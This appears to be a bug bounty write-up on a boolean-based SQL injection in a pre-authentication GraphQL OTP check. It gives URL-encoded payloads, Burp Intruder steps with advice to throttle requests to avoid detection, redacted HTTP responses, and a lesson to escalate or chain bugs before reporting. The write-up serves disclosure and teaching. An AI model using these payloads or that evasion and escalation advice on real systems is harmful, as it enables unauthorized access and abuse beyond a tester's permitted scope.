# Logic Bypass via SQL Injection in GraphQL mutation query — CWE-89

**Status:** `Informative`
**Severity:** High (8.6)
**Date Found:** 2026-11-14
**Date Resolved/Closed:** 2026-11-14
**Program:** Redacted

---

## Summary

Unauthenticated SQL injection in a parameter used in a pre-auth GraphQL mutation bypasses OTP verification leading to the creation of multiple null/invalid accounts.

---

## Methodology

- **Recon approach:** Find parameters potentially used in a query database
- **Testing methodology used:** OWASP Testing Guide | Link -> https://wstg.owasp.org/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server/
- **Tools:** Burp Suite

---

## Technical Detail

1. Begin account registration on target and proceed to OTP verification.
2. Intercept OTP verification request in Burpsuite
3. Create potential payloads for SQL based on the context
4. Use Burp Intruder to fuzz for logic bypass. Make sure to throttle request to avoid detection and use Burp settings for proper encoding.
5. Pick payload that works in this case i used, payload1=__%27%20AND%201%3D1--%20-__ and payload2= __%27%20AND%201%3D2--%20-__
6. Bypass work
7. SQLi Confirmed

### Payload 1 resonse

```response-to-payload1
HTTP/2 200 OK
...
Content-Type: application/json
Accept-Ranges: bytes
Date: Sat, 14 Nov 2026 14:52:07 GMT
X-Cache: HIT
X-Cache-Hits: 0
Vary: User-Agent
Strict-Transport-Security: max-age=31536000
Access-Control-Allow-Methods: HEAD, GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, X-Requested-With
Access-Control-Allow-Credentials: true
Content-Length: 768

{
              "...": ...,
              "userId": "<redacted>",
              "userToken": "<redacted>",
              "status": "OK",
              "...": ...,
              "W...n": "<redacted>",
              "W...ken": "<redacted>"
          }

```
### Payload 2 response

```response-to-payload2
HTTP/2 200 OK
...
X-Powered-By: <redacted>
Content-Type: application/json; charset=utf-8
Accept-Ranges: bytes
Date: Sat, 14 Nov 2026 14:52:07 GMT
X-Cache: MISS, MISS
X-Cache-Hits: 0, 0
Strict-Transport-Security: max-age=31536000
Access-Control-Allow-Headers: Content-Type, X-Requested-With
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
Content-Length: 251

[{"data":{"cr...tp":{"success":false,"userId":null,"errors":[{"message":{"key":"INVALID_OTP","value":"Your OTP is incorrect. Please try again.","__typ...r"},"status":401,"__typename":"Error"}],"__ty..."}}}
]
```

---

## Impact

- Bypass OTP verification process in account creation leading to the creation of null accounts flooding the database.

- Escalate to a boolean-based SQL Injection to fingerprint database or leak data.

---

## Outcome

State plainly what happened:

- Closed as Informative — real vulnerability, but proof-of-impact was limited by program scope rules.

---

## What I'd Do Differently / Lessons Learned

Next time:
- I'll escalate before reporting.
- Chain with another bug to create impact before reporting.

Lesson Learned:
- Companies reward hunters for business impact not confirming a vulnerability exist.

---

## Disclosure Note

*Target identity redacted per responsible disclosure norms. Vulnerability class and methodology shared for educational purposes. __Luckily__ no real user data was accessed or exposed in the course of this research.*
